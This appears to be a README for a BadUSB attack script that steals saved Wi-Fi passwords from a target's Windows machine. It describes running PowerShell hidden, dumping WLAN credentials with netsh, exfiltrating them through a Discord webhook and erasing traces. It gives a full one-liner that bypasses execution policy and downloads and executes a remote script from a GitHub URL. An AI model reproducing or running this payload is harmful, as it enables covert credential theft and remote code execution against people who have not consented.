# WLAN Windows Password - BadUSB ✅

A script used to stole target WLAN Passwords.


**Category**: WLAN, Exfilarate

<div align=center>

<img src="/main/img/logo-repository-2_0.gif" width="600" /><br>
<img src="/main/img/DISCLAIMER.png" width="600" />

</div>

## Description

A script used to stole target WLAN Passwords.

Opens PowerShell hidden, grabs wlan passwords, saves as a file and exfiltrates info via Discord Webhook.

Then it cleans up traces of what you have done after.

## Getting Started

### Dependencies

* An internet connection
* Windows 10,11

### Executing program

* Plug in your device
* Invoke 2 netsh commands
* Invoke-WebRequest will be entered in the Run Box to send the content to Discord

Execution
```powershell
powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "iex (iwr -uri 'https://raw.githubusercontent.com/Zenin0/Glipper_Scripts/main/Windows/Credentials/WWifiPasswords/W-Wifi-Passwords.ps1').Content"
```

